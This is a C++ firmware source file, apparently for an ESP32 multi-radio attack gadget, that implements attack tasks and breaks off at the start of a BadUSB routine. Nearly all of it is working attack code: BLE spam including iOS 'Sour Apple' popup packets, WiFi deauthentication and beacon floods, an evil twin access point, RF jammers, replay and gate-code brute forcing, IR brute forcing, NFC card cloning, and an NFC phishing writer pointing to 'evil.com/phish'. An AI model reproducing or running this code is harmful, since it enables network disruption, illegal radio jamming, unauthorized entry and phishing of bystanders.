#include "attacks_manager.h"
#include "pin_config.h"
#include "rf_core.h"
#include "s3_driver.h"
#include "modules/piezo_driver.h"

// External Dependencies
#include <NimBLEDevice.h>
#include <WiFi.h>
#include <esp_wifi.h>

// Internal Drivers
#include "gps_driver.h"
#include "sd_adapter.h"
#include "nfc_driver.h"
#include "usb_driver.h"
#include "core/aggressive_sd.h"

// TTS, AI e Logging
#include "tts_espeak.h"
#include "q_learn_ia.h"
#include "logger.h"

// ============================================================================
// GLOBALS
// ============================================================================
static AttackType current_attack = ATTACK_NONE;
static TaskHandle_t attack_task_handle = NULL;
static volatile bool stop_requested = false;

// IR Object (YS-IRTM)
static YsIrtm irDriver(PIN_YS_IR_RX, PIN_YS_IR_TX);

// ============================================================================
// HELPER WRAPPERS
// ============================================================================
static void set_module_power(int mod_type) {
    // 0=None, 1=CC1101, 2=PN532, 3=BLE
    bool cc = (mod_type == 1);
    bool nfc = (mod_type == 2);
    bool ble = (mod_type == 3);
    MonsterDriver::powerOnModules(false, ble, nfc, cc);
}

// ============================================================================
// TASK DEFINITIONS
// ============================================================================

// --- NOMES BRASILEIROS PARA BLE SPAM (PSRAM) ---
static const char* ble_names_br[] PROGMEM = {
    // Operadoras
    "Oi Celular", "Vivo 5G", "Claro Fixo", "GVT Internet", "TIM Fibra",
    "NET WiFi", "Oi Fibra", "Vivo TV", "Claro TV", "Sky HD",
    // Porteiros e interfones
    "Intelbras Porteiro", "HDL Interfone", "JFL Alarme", "Amelco Central",
    "Came Portao", "Rossi Motor", "PPA Automatico", "Garen Portao",
    // TVs e dispositivos
    "Samsung Smart TV", "LG TV", "Philco TV", "TCL Android", "AOC Smart",
    "Multilaser Tab", "Positivo Tablet", "Xiaomi Mi", "Motorola Edge",
    // Áudio
    "JBL Speaker", "Philips SoundBar", "Mondial Caixa", "Britania Som",
    // Eletrodomésticos
    "Electrolux Smart", "Brastemp Geladeira", "Consul AC", "Midea Ar",
    // Acessórios
    "Haylou GT", "QCY Fone", "Redmi Buds", "Baseus TWS", "Edifier X3",
    // Carros
    "VW Connect", "Fiat Live On", "GM OnStar", "Toyota Link", "Honda Sense",
    // Genéricos
    "Bluetooth Device", "Wireless Audio", "Smart Speaker", "TV Box",
    "Robot Aspirador", "Cafeteira Smart", "Lampada WiFi", "Tomada Inteligente"
};
#define BLE_NAMES_COUNT (sizeof(ble_names_br) / sizeof(ble_names_br[0]))

// --- BLE SPAM TASK - 1200 PACOTES/SEGUNDO ---
static void task_ble_spam(void *pvParameters) {
    Serial.println("[ATTACK] BLE Spam BR iniciando - 1200 pps...");
    set_module_power(3);
    
    // Inicializa NimBLE sem nome fixo
    NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // Máxima potência
    
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setMinInterval(0x20);  // Mínimo intervalo
    pAdvertising->setMaxInterval(0x20);
    
    // Buffer para MAC randômico
    uint8_t randomMac[6];
    uint32_t packet_count = 0;
    uint32_t start_time = millis();
    
    // Aloca buffer na PSRAM para advertising data
    NimBLEAdvertisementData* advData = new NimBLEAdvertisementData();
    
    // Voz: "BLE spamando"
    extern void tts_speak(const char*);
    tts_speak("ble_spamando");
    
    while (!stop_requested) {
        // MAC randômico (primeiro byte com bit local setado)
        esp_fill_random(randomMac, 6);
        randomMac[0] = (randomMac[0] | 0x02) & 0xFE;  // Local, unicast
        
        // Muda MAC
        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
        ble_hs_id_set_rnd(randomMac);
        
        // Nome aleatório da lista BR
        int nameIdx = random(BLE_NAMES_COUNT);
        advData->setName(ble_names_br[nameIdx]);
        
        // Flags BLE
        advData->setFlags(ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT);
        
        pAdvertising->setAdvertisementData(*advData);
        pAdvertising->start(0);  // Non-blocking
        
        // 1200 pps = 833us entre pacotes
        delayMicroseconds(833);
        
        pAdvertising->stop();
        packet_count++;
        
        // Log a cada 1000 pacotes
        if (packet_count % 1000 == 0) {
            uint32_t elapsed = millis() - start_time;
            float pps = (packet_count * 1000.0f) / elapsed;
            Serial.printf("[BLE] %lu pacotes, %.0f pps, MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                          packet_count, pps,
                          randomMac[0], randomMac[1], randomMac[2],
                          randomMac[3], randomMac[4], randomMac[5]);
        }
    }
    
    delete advData;
    NimBLEDevice::deinit();
    set_module_power(0);
    Serial.printf("[BLE] Spam finalizado: %lu pacotes\n", packet_count);
    vTaskDelete(NULL);
}

// --- BLE SOUR APPLE (iOS Crash) ---
static void task_ble_sour_apple(void *pvParameters) {
    Serial.println("[ATTACK] Starting Sour Apple (iOS)...");
    set_module_power(3);
    NimBLEDevice::init("");
    
    NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
    
    // Apple proximity pairing packet
    uint8_t appleData[] = {
        0x10, 0xFF,             // Manufacturer Specific Data
        0x4C, 0x00,             // Apple Inc
        0x0F, 0x05,             // Proximity Pairing
        0x01,                   // Packet Type
        0x00,                   // Device Model (random)
        0x00,                   // Status
        0x00, 0x00, 0x00        // Padding
    };
    
    while (!stop_requested) {
        // Randomize device model to cause multiple popups
        appleData[7] = random(0x00, 0xFF);
        appleData[8] = random(0x00, 0x10);
        
        NimBLEAdvertisementData advData;
        advData.addData(std::string((char*)appleData, sizeof(appleData)));
        pAdv->setAdvertisementData(advData);
        pAdv->start();
        delay(50);
        pAdv->stop();
    }
    
    NimBLEDevice::deinit();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- BLE SWIFT PAIR (Windows) ---
static void task_ble_swift_pair(void *pvParameters) {
    Serial.println("[ATTACK] Starting Swift Pair (Windows)...");
    set_module_power(3);
    NimBLEDevice::init("");
    
    NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
    
    // Microsoft Swift Pair packet
    uint8_t swiftData[] = {
        0x06, 0xFF,             // Manufacturer Data
        0x06, 0x00,             // Microsoft
        0x03,                   // Swift Pair
        0x00,                   // Scenario
        0x80,                   // Reserved
        0x00                    // Device ID
    };
    
    const char* deviceNames[] = {"Surface Mouse", "Xbox Controller", "Arc Mouse", "Designer Mouse"};
    int idx = 0;
    
    while (!stop_requested) {
        swiftData[7] = random(0, 0xFF);
        
        NimBLEAdvertisementData advData;
        advData.setName(deviceNames[idx % 4]);
        advData.addData(std::string((char*)swiftData, sizeof(swiftData)));
        pAdv->setAdvertisementData(advData);
        pAdv->start();
        delay(100);
        pAdv->stop();
        idx++;
    }
    
    NimBLEDevice::deinit();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- BLE FAST PAIR (Android) ---
static void task_ble_fast_pair(void *pvParameters) {
    Serial.println("[ATTACK] Starting Fast Pair (Android)...");
    set_module_power(3);
    NimBLEDevice::init("");
    
    NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
    
    // Google Fast Pair service data
    // Model IDs from real devices
    uint32_t modelIds[] = {
        0x2D7A23,  // Pixel Buds
        0x00B727,  // Sony WF-1000XM4
        0xCD8256,  // Samsung Buds
        0x0000F0,  // JBL
        0xD446A7   // Beats
    };
    
    int idx = 0;
    
    while (!stop_requested) {
        uint32_t modelId = modelIds[idx % 5];
        
        uint8_t fastPairData[] = {
            0x03, 0x03, 0x2C, 0xFE,  // Service UUID
            0x06, 0x16, 0x2C, 0xFE,  // Service Data header
            (uint8_t)((modelId >> 16) & 0xFF),
            (uint8_t)((modelId >> 8) & 0xFF),
            (uint8_t)(modelId & 0xFF)
        };
        
        NimBLEAdvertisementData advData;
        advData.addData(std::string((char*)fastPairData, sizeof(fastPairData)));
        pAdv->setAdvertisementData(advData);
        pAdv->start();
        delay(100);
        pAdv->stop();
        idx++;
    }
    
    NimBLEDevice::deinit();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- WIFI DEAUTH TASK - 1500 FRAMES/SEGUNDO ---
static void task_wifi_deauth(void *pvParameters) {
    Serial.println("[ATTACK] WiFi Deauth iniciando - 1500 fps...");
    
    // Configura WiFi em modo STA para injeção
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    
    // Habilita modo promíscuo para injeção de pacotes
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    
    // Frame template de deauth (26 bytes)
    uint8_t deauthFrame[] = {
        0xC0, 0x00,                         // Frame Control (Deauth)
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
        0x00, 0x00,                         // Sequence
        0x07, 0x00                          // Reason (Class 3 frame)
    };
    
    // Frame de disassociation
    uint8_t disassocFrame[26];
    memcpy(disassocFrame, deauthFrame, 26);
    disassocFrame[0] = 0xA0;  // Disassoc frame type
    
    // Estatísticas
    uint32_t frame_count = 0;
    uint32_t start_time = millis();
    
    // Voz: "Deauth rodando"
    extern void tts_speak(const char*);
    tts_speak("deauth_rodando");
    
    // Scan inicial de alvos
    int n = WiFi.scanNetworks(false, false, false, 100);
    Serial.printf("[DEAUTH] %d alvos encontrados\n", n);
    
    // Armazena alvos (máximo 20)
    struct Target {
        uint8_t bssid[6];
        uint8_t channel;
        int rssi;
    };
    Target targets[20];
    int numTargets = min(n, 20);
    
    for (int i = 0; i < numTargets; i++) {
        uint8_t* bssid = WiFi.BSSID(i);
        if (bssid) {
            memcpy(targets[i].bssid, bssid, 6);
            targets[i].channel = WiFi.channel(i);
            targets[i].rssi = WiFi.RSSI(i);
        }
    }
    WiFi.scanDelete();
    
    // Loop principal de ataque
    int currentTarget = 0;
    
    while (!stop_requested) {
        if (numTargets == 0) {
            delay(1000);
            continue;
        }
        
        // Seleciona alvo
        Target* t = &targets[currentTarget % numTargets];
        
        // Muda canal
        esp_wifi_set_channel(t->channel, WIFI_SECOND_CHAN_NONE);
        
        // Configura MACs no frame
        memcpy(&deauthFrame[10], t->bssid, 6);   // Source
        memcpy(&deauthFrame[16], t->bssid, 6);   // BSSID
        memcpy(&disassocFrame[10], t->bssid, 6);
        memcpy(&disassocFrame[16], t->bssid, 6);
        
        // Envia rajada de 100 frames no alvo atual
        for (int j = 0; j < 100 && !stop_requested; j++) {
            // Alterna deauth e disassoc
            if (j % 2 == 0) {
                esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
            } else {
                esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, sizeof(disassocFrame), false);
            }
            
            frame_count++;
            
            // 1500 fps = 666us entre frames
            delayMicroseconds(666);
        }
        
        // Próximo alvo
        currentTarget++;
        
        // Log a cada 1000 frames
        if (frame_count % 1000 == 0) {
            uint32_t elapsed = millis() - start_time;
            float fps = (frame_count * 1000.0f) / elapsed;
            Serial.printf("[DEAUTH] %lu frames, %.0f fps, alvo: %02X:%02X:%02X:%02X:%02X:%02X\n",
                          frame_count, fps,
                          t->bssid[0], t->bssid[1], t->bssid[2],
                          t->bssid[3], t->bssid[4], t->bssid[5]);
        }
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    Serial.printf("[DEAUTH] Finalizado: %lu frames\n", frame_count);
    vTaskDelete(NULL);
}

// --- WIFI BEACON FLOOD BR - 500 APs/SEGUNDO ---
static const char* ssids_br[] PROGMEM = {
    // Operadoras
    "Vivo Fibra", "Vivo TV", "Vivo WiFi", "Vivo 5G Home",
    "GVT Internet", "GVT Fibra", "GVT Guest",
    "Oi Fibra", "Oi WiFi", "Oi Total",
    "NET WiFi", "NET Virtua", "NET Guest", "Claro NET",
    "Claro Fibra", "Claro WiFi", "Claro 5G",
    "TIM Fibra", "TIM WiFi", "TIM Live",
    "Sky WiFi", "Sky Fibra",
    // Estabelecimentos
    "McDonalds Free WiFi", "Starbucks WiFi", "iFood Parceiro",
    "Uber Free WiFi", "99 Taxi", "Rappi Express",
    "Mercado Livre", "Magazine Luiza", "Casas Bahia WiFi",
    // Bancos
    "Itau Atendimento", "Bradesco Digital", "Banco do Brasil",
    "Caixa WiFi", "Santander Guest", "Nubank Office",
    // Governo
    "WiFi Livre SP", "Internet Gratuita RJ", "Prefeitura WiFi",
    // Genéricos
    "Condominio Residencial", "Portaria", "Salao Festas",
    "Academia Smart Fit", "Farmacia Popular",
    "Hospital WiFi", "Escola Publica", "Igreja Evangelica"
};
#define SSIDS_BR_COUNT (sizeof(ssids_br) / sizeof(ssids_br[0]))

static void task_wifi_beacon_spam(void *pvParameters) {
    Serial.println("[ATTACK] Beacon Flood BR iniciando - 500 APs/s...");
    
    // Promiscuous mode para injeção de beacons crus
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    
    // Template de beacon frame (80 bytes base)
    uint8_t beaconFrame[] = {
        0x80, 0x00,                         // Frame Control (Beacon)
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (random MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (same as source)
        0x00, 0x00,                         // Sequence
        // Fixed parameters (12 bytes)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
        0x64, 0x00,                         // Beacon interval (100ms)
        0x11, 0x04,                         // Capabilities
        // Tagged parameters start here...
    };
    
    // Buffer para frame completo
    uint8_t fullFrame[128];
    
    uint32_t beacon_count = 0;
    uint32_t start_time = millis();
    
    // Voz
    extern void tts_speak(const char*);
    tts_speak("ataque_iniciado");
    
    while (!stop_requested) {
        for (int i = 0; i < 50 && !stop_requested; i++) {
            // MAC randômico
            uint8_t mac[6];
            esp_fill_random(mac, 6);
            mac[0] = (mac[0] & 0xFC) | 0x02;  // Local, unicast
            
            memcpy(&beaconFrame[10], mac, 6);  // Source
            memcpy(&beaconFrame[16], mac, 6);  // BSSID
            
            // SSID aleatório
            int ssidIdx = random(SSIDS_BR_COUNT);
            const char* ssid = ssids_br[ssidIdx];
            uint8_t ssidLen = strlen(ssid);
            
            // Monta frame completo
            memcpy(fullFrame, beaconFrame, 36);
            
            // Tag SSID
            fullFrame[36] = 0x00;  // Tag ID: SSID
            fullFrame[37] = ssidLen;
            memcpy(&fullFrame[38], ssid, ssidLen);
            
            // Tag Supported Rates
            uint8_t ratesOffset = 38 + ssidLen;
            fullFrame[ratesOffset] = 0x01;  // Tag ID
            fullFrame[ratesOffset + 1] = 8; // Length
            uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
            memcpy(&fullFrame[ratesOffset + 2], rates, 8);
            
            // Tag Channel
            uint8_t chanOffset = ratesOffset + 10;
            uint8_t channel = random(1, 14);
            fullFrame[chanOffset] = 0x03;     // Tag ID: DS Parameter
            fullFrame[chanOffset + 1] = 1;    // Length
            fullFrame[chanOffset + 2] = channel;
            
            int frameLen = chanOffset + 3;
            
            // Canal aleatório
            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            
            // Envia beacon
            esp_wifi_80211_tx(WIFI_IF_STA, fullFrame, frameLen, false);
            
            beacon_count++;
            
            // 500 beacons/s = 2ms entre cada
            delayMicroseconds(2000);
        }
        
        // Log a cada 1000 beacons
        if (beacon_count % 1000 == 0) {
            uint32_t elapsed = millis() - start_time;
            float bps = (beacon_count * 1000.0f) / elapsed;
            Serial.printf("[BEACON] %lu beacons, %.0f/s\n", beacon_count, bps);
        }
    }
    
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    Serial.printf("[BEACON] Finalizado: %lu beacons\n", beacon_count);
    vTaskDelete(NULL);
}

// --- WIFI EVIL TWIN ---
static void task_wifi_evil_twin(void *pvParameters) {
    Serial.println("[ATTACK] Starting Evil Twin...");
    
    // First, scan for target network
    WiFi.mode(WIFI_MODE_STA);
    int n = WiFi.scanNetworks();
    
    if (n == 0) {
        Serial.println("[EVIL TWIN] No networks found");
        vTaskDelete(NULL);
        return;
    }
    
    // Clone the strongest network
    String targetSSID = WiFi.SSID(0);
    int targetChannel = WiFi.channel(0);
    
    Serial.printf("[EVIL TWIN] Cloning: %s on ch %d\n", targetSSID.c_str(), targetChannel);
    
    // Setup as AP with same SSID (open network)
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP(targetSSID.c_str(), "", targetChannel);
    
    // The web dashboard handles the captive portal
    Serial.println("[EVIL TWIN] Captive portal active");
    
    while (!stop_requested) {
        delay(1000);
    }
    
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    vTaskDelete(NULL);
}

// --- WIFI PMKID CAPTURE ---
static void task_wifi_pmkid(void *pvParameters) {
    Serial.println("[ATTACK] Starting PMKID Capture...");
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(true);
    
    // The PMKID is in the first EAPOL message
    // This is a passive capture - we just log potential PMKID frames
    
    while (!stop_requested) {
        // Scan networks
        int n = WiFi.scanNetworks(false, false);
        
        for (int i = 0; i < n && !stop_requested; i++) {
            String ssid = WiFi.SSID(i);
            int rssi = WiFi.RSSI(i);
            
            if (WiFi.encryptionType(i) == WIFI_AUTH_WPA2_PSK ||
                WiFi.encryptionType(i) == WIFI_AUTH_WPA_WPA2_PSK) {
                Serial.printf("[PMKID] Target found: %s (%d dBm) - WPA2\n", ssid.c_str(), rssi);
                // Real PMKID capture would require monitoring EAPOL frames
            }
        }
        
        WiFi.scanDelete();
        delay(5000);
    }
    
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    vTaskDelete(NULL);
}

// --- WIFI WARDRIVING TASK ---
// Scans networks and logs with GPS coordinates
static void task_wifi_wardrive(void *pvParameters) {
    Serial.println("[ATTACK] Starting WiFi Wardriving...");
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();

    // Create wardriving log file
    char filename[32];
    snprintf(filename, sizeof(filename), "/wardrive_%lu.csv", millis());

    // Header
    SDAdapter::appendFile(SD, filename, "Date,Time,Lat,Lon,Alt,HDOP,SSID,BSSID,RSSI,Channel,Encrypt\n");

    while (!stop_requested) {
        int n = WiFi.scanNetworks(false, true); // Async=false, Hidden=true

        if (n > 0) {
            // Get GPS Data once for this batch
            double lat = GPSDriver::getLatitude();
            double lon = GPSDriver::getLongitude();
            String date = GPSDriver::getDateString();
            String time = GPSDriver::getTimeString();
            double alt = GPSDriver::getAltitude();
            double hdop = GPSDriver::getHDOP();

            for (int i = 0; i < n; ++i) {
                // Log to CSV
                char logLine[256];
                snprintf(
                    logLine,
                    sizeof(logLine),
                    "%s,%s,%.6f,%.6f,%.1f,%.1f,%s,%s,%d,%d,%d\n",
                    date.c_str(),
                    time.c_str(),
                    lat,
                    lon,
                    alt,
                    hdop,
                    WiFi.SSID(i).c_str(),
                    WiFi.BSSIDstr(i).c_str(),
                    WiFi.RSSI(i),
                    WiFi.channel(i),
                    WiFi.encryptionType(i)
                );

                SDAdapter::appendFile(SD, filename, logLine);
                Serial.printf("[WARDRIVE] Logged: %s (%d dBm)\n", WiFi.SSID(i).c_str(), WiFi.RSSI(i));
            }
        }

        WiFi.scanDelete();
        delay(100); // Small pause between scans
    }

    WiFi.mode(WIFI_OFF);
    vTaskDelete(NULL);
}

// --- RF JAMMER CONTINUOUS 433 ---
static void task_rf_jammer_433(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Jammer 433MHz...");
    set_module_power(1);

    RFCore::startJammerContinuous(FREQ_433);

    while (!stop_requested) { RFCore::updateJammer(); }

    RFCore::stopJammer();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- RF JAMMER 315 ---
static void task_rf_jammer_315(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Jammer 315MHz...");
    set_module_power(1);

    RFCore::startJammerContinuous(FREQ_315);

    while (!stop_requested) { RFCore::updateJammer(); }

    RFCore::stopJammer();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- RF JAMMER 868 ---
static void task_rf_jammer_868(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Jammer 868MHz...");
    set_module_power(1);

    RFCore::startJammerContinuous(FREQ_868);

    while (!stop_requested) { RFCore::updateJammer(); }

    RFCore::stopJammer();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- RF JAMMER BURST ---
static void task_rf_jammer_burst(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Jammer BURST...");
    set_module_power(1);

    RFCore::startJammerBurst(FREQ_433, 100, 50);

    while (!stop_requested) { RFCore::updateJammer(); }

    RFCore::stopJammer();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- RF JAMMER SMART ---
static void task_rf_jammer_smart(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Jammer SMART...");
    set_module_power(1);

    RFCore::startJammerSmart(FREQ_433);

    while (!stop_requested) { RFCore::updateJammer(); }

    RFCore::stopJammer();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- RF CAPTURE ---
static void task_rf_capture(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Capture...");
    set_module_power(1);

    RFCore::startReceive(FREQ_433);

    while (!stop_requested) {
        if (RFCore::hasSignal()) {
            CapturedSignal sig = RFCore::getLastCapture();
            Serial.printf(
                "[RF] Captured: %d bytes, RSSI: %d, Proto: %s\n",
                sig.rawLength,
                sig.rssi,
                RFCore::getProtocolName(sig.protocol)
            );

            // Auto-save to SD
            char filename[32];
            snprintf(filename, sizeof(filename), "/subghz/capture_%lu.txt", millis());
            RFCore::saveSignal(filename, &sig);
        }
        delay(10);
    }

    RFCore::stopReceive();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- RF REPLAY ---
static void task_rf_replay(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Replay...");
    set_module_power(1);

    if (!RFCore::replayLast()) { Serial.println("[ATTACK] No signal to replay!"); }

    set_module_power(0);
    vTaskDelete(NULL);
}

// --- RF GHOST REPLAY ---
static void task_rf_ghost(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Ghost Replay...");
    set_module_power(1);

    RFCore::startGhostReplay(8000, 45000, 10);

    while (!stop_requested && RFCore::isGhostActive()) {
        // Ghost timing handled internally
        CapturedSignal sig = RFCore::getLastCapture();
        if (sig.valid) {
            uint32_t now = millis();
            // Check if it's time for next replay
            delay(100);
        }
    }

    RFCore::stopGhostReplay();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- RF BRUTE FORCE ---
static void task_rf_brute(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Brute Force...");
    set_module_power(1);

    RFCore::startBruteForce(FREQ_433, 12, PROTO_CAME); // 12-bit CAME codes

    while (!stop_requested && RFCore::isBruteForcing()) {
        RFCore::updateBruteForce();

        if (RFCore::getBruteProgress() % 100 == 0) {
            Serial.printf(
                "[RF] Brute: %lu/%lu (%.1f%%)\n",
                RFCore::getBruteProgress(),
                RFCore::getBruteTotal(),
                (float)RFCore::getBruteProgress() / RFCore::getBruteTotal() * 100
            );
        }
    }

    RFCore::stopBruteForce();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- RF SPECTRUM ANALYZER ---
static void task_rf_spectrum(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Spectrum Analyzer...");
    set_module_power(1);

    RFCore::startFrequencyScan(430.0f, 440.0f, 0.1f);

    while (!stop_requested) {
        RFCore::updateScanner();

        SpectrumData data = RFCore::getSpectrumData();
        float strongest = RFCore::findStrongestFrequency();

        Serial.printf("[RF] Scan: Strongest @ %.2f MHz\n", strongest);
        delay(500);
    }

    RFCore::stopFrequencyScan();
    set_module_power(0);
    vTaskDelete(NULL);
}

// --- IR TV OFF (NEC ONLY) ---
static void task_ir_tv_off(void *pvParameters) {
    Serial.println("[ATTACK] Starting IR TV-B-Gone (NEC Only)...");
    irDriver.begin();

    // Common NEC TV Power Codes
    // Struct: { UserCode, CommandCode }
    struct IrCode {
        uint16_t user;
        uint8_t cmd;
    };

    const IrCode codes[] = {
        {0x20DF, 0x10}, // LG Power (User: 20DF, Cmd: 10)
        {0x0707, 0x02}, // Generic NEC
        {0x0000, 0x12}, // Example
        // Note: Samsung/Sony are NOT NEC, so they are removed
    };

    while (!stop_requested) {
        for (int i = 0; i < 3 && !stop_requested; i++) {
            irDriver.sendNEC(codes[i].user, codes[i].cmd);
            delay(100);
        }
        delay(1000);
    }

    irDriver.end();
    vTaskDelete(NULL);
}

// --- IR CLONE (NEC) ---
static void task_ir_clone(void *pvParameters) {
    Serial.println("[ATTACK] Starting IR Cloner...");
    irDriver.begin();

    while (!stop_requested) {
        uint16_t userCode;
        uint8_t cmdCode;

        if (irDriver.read(&userCode, &cmdCode)) {
            Serial.printf("[IR] Captured: User=0x%04X, Cmd=0x%02X\n", userCode, cmdCode);

            // Save to SD
            char filename[64];
            snprintf(filename, sizeof(filename), "/ir_capture.txt"); // Simple append
            char logLine[64];
            snprintf(logLine, sizeof(logLine), "NEC,0x%04X,0x%02X\n", userCode, cmdCode);
            SDAdapter::appendFile(SD, filename, logLine);

            // Blink LED or feedback?
        }
        delay(10);
    }

    irDriver.end();
    vTaskDelete(NULL);
}

// --- IR BRUTE FORCE (NEC) ---
static void task_ir_brute(void *pvParameters) {
    Serial.println("[ATTACK] Starting IR Brute Force...");
    irDriver.begin();

    // Brute force through common NEC codes
    for (uint16_t userCode = 0x0000; userCode <= 0xFFFF && !stop_requested; userCode += 0x0101) {
        for (uint8_t cmd = 0x00; cmd <= 0x20 && !stop_requested; cmd++) {
            irDriver.sendNEC(userCode, cmd);
            delay(50);
            
            if (userCode % 0x1000 == 0) {
                Serial.printf("[IR] Brute: User=0x%04X, Cmd=0x%02X\n", userCode, cmd);
            }
        }
    }

    irDriver.end();
    vTaskDelete(NULL);
}

// --- NFC CLONE TASK (PN532) ---
static void task_nfc_clone(void *pvParameters) {
    Serial.println("[ATTACK] Starting NFC Clone...");
    
    if (!NFCDriver::init()) {
        Serial.println("[NFC] Failed to initialize PN532");
        vTaskDelete(NULL);
        return;
    }
    
    Serial.println("[NFC] Waiting for card to clone...");
    Serial.println("[NFC] Place card near reader...");
    
    while (!stop_requested) {
        NFCCard card = NFCDriver::readCard(500);
        
        if (card.valid) {
            Serial.printf("[NFC] Card found! UID: %s\n", 
                         NFCDriver::uidToString(card.uid, card.uidLength).c_str());
            Serial.printf("[NFC] Type: %s\n", NFCDriver::getTypeName(card.type));
            
            // Clone to SD card
            char filename[64];
            snprintf(filename, sizeof(filename), "/nfc/clone_%s.json",
                    NFCDriver::uidToString(card.uid, card.uidLength).c_str());
            
            if (NFCDriver::cloneToFile(filename)) {
                Serial.printf("[NFC] Card cloned to %s\n", filename);
                // Beep for feedback
                Piezo.beep(2, 100);
            } else {
                Serial.println("[NFC] Clone failed!");
                Piezo.playErrorSound();
            }
            
            delay(2000); // Wait before next read
        }
        
        delay(100);
    }
    
    vTaskDelete(NULL);
}

// --- NFC FAULT INJECTION TASK ---
static void task_nfc_fault(void *pvParameters) {
    Serial.println("[ATTACK] Starting NFC Fault Injection...");
    
    if (!NFCDriver::init()) {
        Serial.println("[NFC] Failed to initialize PN532");
        vTaskDelete(NULL);
        return;
    }
    
    Serial.println("[NFC] Fault injection mode active...");
    Serial.println("[NFC] Cycling through fault patterns...");
    
    uint8_t pattern = 0;
    
    while (!stop_requested) {
        // Try to read any card first
        NFCCard card = NFCDriver::readCard(200);
        
        if (card.valid) {
            Serial.printf("[NFC] Target detected: %s\n",
                         NFCDriver::uidToString(card.uid, card.uidLength).c_str());
            
            // Send fault pattern
            NFCDriver::sendFaultPattern(pattern);
            Serial.printf("[NFC] Sent fault pattern %d\n", pattern);
            
            pattern = (pattern + 1) % 4;
            delay(500);
        } else {
            // No card - do rapid polling as interference
            NFCDriver::sendFaultPattern(2); // Rapid polling
            delay(100);
        }
    }
    
    vTaskDelete(NULL);
}

// --- NFC PHISHING TASK ---
static void task_nfc_phishing(void *pvParameters) {
    Serial.println("[ATTACK] Starting NFC Phishing...");
    
    if (!NFCDriver::init()) {
        Serial.println("[NFC] Failed to initialize PN532");
        vTaskDelete(NULL);
        return;
    }
    
    // Phishing URL - change to your attack server
    const char* phishingUrl = "evil.com/phish";
    
    Serial.printf("[NFC] Preparing phishing NDEF: http://%s\n", phishingUrl);
    
    if (NFCDriver::emulateNDEF(phishingUrl)) {
        Serial.println("[NFC] NDEF prepared. Write to writable tag or wait for emulation.");
    }
    
    // Wait for writable tag to write phishing NDEF
    while (!stop_requested) {
        NFCCard card = NFCDriver::readCard(500);
        
        if (card.valid && card.type == NFC_TYPE_MIFARE_ULTRALIGHT) {
            Serial.println("[NFC] Writable tag detected - writing phishing URL...");
            
            // Create simple NDEF URI record
            uint8_t ndefData[16] = {
                0x03, 0x0D,               // NDEF message header
                0xD1, 0x01, 0x09,         // Record header
                'U',                       // Type: URI
                0x01,                      // Identifier: http://www.
            };
            memcpy(&ndefData[7], phishingUrl, min(9, (int)strlen(phishingUrl)));
            ndefData[15] = 0xFE; // Terminator
            
            // Note: Full NTAG write would need different approach
            Serial.println("[NFC] Phishing tag would be written here");
            
            Piezo.beep(1, 200);
            delay(2000);
        }
        
        delay(100);
    }
    
    NFCDriver::stopEmulation();
    vTaskDelete(NULL);
}

// --- USB BADUSB TASK ---
static void task_usb_badusb(void *pvParameters) {
    Serial.println("[ATTACK] Starting BadUSB...");
    
    if (!USBDriver::init()) {
        Serial.println("[USB] Failed to initialize USB HID");
